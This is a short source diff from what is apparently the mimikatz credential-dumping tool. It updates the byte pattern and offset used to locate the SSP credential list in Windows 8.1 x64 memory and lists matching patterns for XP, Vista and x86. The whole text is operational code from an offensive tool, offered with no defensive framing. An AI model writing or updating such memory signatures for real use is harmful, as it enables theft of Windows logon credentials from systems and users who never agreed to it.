@@ -8,11 +8,11 @@
 #ifdef _M_X64
 BYTE PTRN_WIN5_SspCredentialList[]	= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
 BYTE PTRN_WIN6_SspCredentialList[]	= {0xc7, 0x47, 0x24, 0x43, 0x72, 0x64, 0x41, 0x48, 0x89, 0x47, 0x78, 0xff, 0x15};
-BYTE PTRN_WIN81_SspCredentialList[]	= {0x0f, 0xb6, 0xc0, 0x85, 0xc0, 0x75};
+BYTE PTRN_WIN81_SspCredentialList[]	= {0x4c, 0x8b, 0xb4, 0x24, 0xc0, 0x00, 0x00, 0x00};
 KULL_M_PATCH_GENERIC SspReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_SspCredentialList),	PTRN_WIN5_SspCredentialList},	{0, NULL}, {16}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_SspCredentialList),	PTRN_WIN6_SspCredentialList},	{0, NULL}, {20}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WIN81_SspCredentialList),	PTRN_WIN81_SspCredentialList},	{0, NULL}, {13}},
+	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WIN81_SspCredentialList),	PTRN_WIN81_SspCredentialList},	{0, NULL}, {-13}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_SspCredentialList[]	= {0x1c, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
